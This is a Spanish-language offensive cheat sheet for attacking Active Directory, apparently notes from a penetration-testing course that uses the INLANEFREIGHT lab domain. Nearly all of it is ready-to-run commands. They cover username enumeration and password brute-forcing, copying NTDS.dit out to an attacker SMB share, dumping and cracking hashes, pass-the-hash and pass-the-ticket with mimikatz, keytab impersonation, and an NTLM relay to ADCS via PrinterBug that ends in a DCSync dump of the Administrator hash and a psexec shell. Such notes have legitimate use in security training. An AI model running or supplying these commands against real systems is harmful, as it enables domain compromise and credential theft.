# Sistemas Empresariales

## Active Directory Windows

### Ataques de diccionario contra cuentas de AD

#### Netexec

Obtener software de generación de nombres de usuario

```bash
git clone https://github.com/urbanadventurer/username-anarchy.git
```

Generar lista de credenciales a partir del nombre de la persona

```bash
./username-anarchy -i <file.names> 
```

Enumerar nombres de usuarios validos en AD

```bash
git clone https://github.com/ropnop/kerbrute.git
```

{% code overflow="wrap" %}
```bash
./kerbrute_linux_amd64 userenum --dc 10.10.10.10 --domain <domain>.local <file.names>
```
{% endcode %}

Efectuar ataque de fuerza bruta sobre usuarios validos en AD

```bash
netexec smb 10.10.10.10 -u <user> -p <diccionario> # usar fastrack o similar
```

### Ataque NTDS Autenticado

Metodo recortado

```bash
netexec smb 10.10.10.10 -u <user> -p '<password>' -M ntdsutil
```

#### Extracción de hash AD

Conectarse a un controlador de dominio DC

```bash
evil-winrm -i 10.10.10.10  -u <user> -p '<password>'
```

Revisar permisos del grupo asociado a la cuenta

```powershell
net localgroup
```

Revisar permisos del usuario, debe ser domain admin

```powershell
net user bwilliamson
```

Generar instantanea del volumen c:

```powershell
vssadmin CREATE SHADOW /For=C:
```

Copiar NTDS.dit

{% code overflow="wrap" %}
```
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```
{% endcode %}

Exfiltrar información mediante smb

{% code overflow="wrap" %}
```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support <nombre.recurso> /home/<user>/<carpeta>/
```
{% endcode %}

Mover las copias al servidor

```powershell
move <file>.save \\10.10.10.10\<nombre.recurso>
```

Extracciones de hash NTDS

```bash
impacket-secretsdump -ntds <NTDS.dit> -system SYSTEM LOCAL
```

Descifrar hash descubiertos

```bash
sudo hashcat -m 1000 <hash> <diccionario>
```

### Pass the Hash

Autenticación mediante hash

```bash
evil-winrm -i 10.10.10.10 -u <usuario> -H <hash>
```

### Over the Hash

Exportación de llaves disponibles

```powershell
mimikatz.exe privilege::debug
```

```powershell
sekurlsa::ekeys
```

Usar la clave para generar procesos

```powershell
sekurlsa::pth /domain:internal.local /user:plaintext /ntlm:<hash>
```

### Pass the Ticket

#### Mimikatz

Exportación de tickets disponibles

```powershell
mimikatz.exe privilege::debug
```

```bash
sekurlsa::tickets /export
```

Cargar ticket de usuario

{% code overflow="wrap" %}
```powershell
kerberos::ptt "C:\[0;474c0]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
```
{% endcode %}

Iniciar sesión en consola Powershell con ticket

```powershell
Enter-PSSession -ComputerName <HostNameLocal>
```

Conectarse a un recurso compartido smb

```bash
dir \\host.domain.local\c$
```

## Active Directory Linux

### Servicios AD

Detección si la máquina esta conectada a un dominio y su grupo

```bash
realm list
```

```bash
ps -ef | grep -i "winbind\|sssd"
```

### Busqueda Tickets

Encontrar tickets de AD dentro del sistema

```bash
find / -name *keytab* -ls 2>/dev/null
```

Encontrar tickets dentro de tareas programadas

```bash
crontab -l
```

#### Tickets temporales&#x20;

```bash
env | grep -i krb5
```

### Suplantación de Usuario

Copai de seguridad del ticket actual

```bash
klist
```

```bash
cp /tmp/<ticket> /home/
```

Cargar ticket

```bash
kinit <user>@domain.local -k -t /opt/specialfiles/<user>.keytab
```

Validar suplantación

```bash
klist
```

```bash
response: Default principal: <user>@domain.local
```

Conectarse a servicio

```bash
smbclient //dc01/<user> -k -c ls
```

Extracción del Hash

Obtener datos del archivo keytab

```bash
python3 /opt/keytabextract.py /opt/specialfiles/<user>.keytab
```

Proceder con obtención de contraseña mediante descifrado NTLM o Bypass usando ticket Rudeus

Iniciar sesión

```bash
su - <user>@domain.local
```

### NTLM Relay Attack

Identificar entidad certificadora web

```bash
http://10.10.10.10/certsrv/certfnsh.asp
```

Poner en escucha de registros sobre la entidad

{% code overflow="wrap" %}
```bash
impacket-ntlmrelayx -t http://10.10.10.10/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```
{% endcode %}

Explotación vulnerabilidad printerbug

{% code overflow="wrap" %}
```bash
python3 printerbug.py INLANEFREIGHT.LOCAL/user:"password"@<DCIP> <IP.Attacker.linux>
```
{% endcode %}

Obtener ticket kerberos

```bash
git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
```

```bash
python3 -m venv .venv
```

```bash
source .venv/bin/activate
```

```bash
pip3 install -r requirements.txt
```

{% code overflow="wrap" %}
```bash
python3 gettgtpkinit.py -cert-pfx <file.pfx> -dc-ip 10.10.10.10 'inlanefreight.local/dc01$' /tmp/dc.ccache
```
{% endcode %}

```bash
exit
```

Efectuar ataque Pass The Ticket

```bash
export KRB5CCNAME=/tmp/dc.ccache
```

{% code overflow="wrap" %}
```bash
impacket-secretsdump -k -no-pass -dc-ip 10.10.10.10 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
```
{% endcode %}

```bash
RESULT: Administrator:500:aad3b435b51404eeaad3b435b51404ee:...SNIP...:::
```

Conectarse con el hash

{% code overflow="wrap" %}
```bash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:fd02e525dd676fd8ca04e200d265f20c 'INLANEFREIGHT.LOCAL/Administrator'@DC01.INLANEFREIGHT.LOCAL
```
{% endcode %}
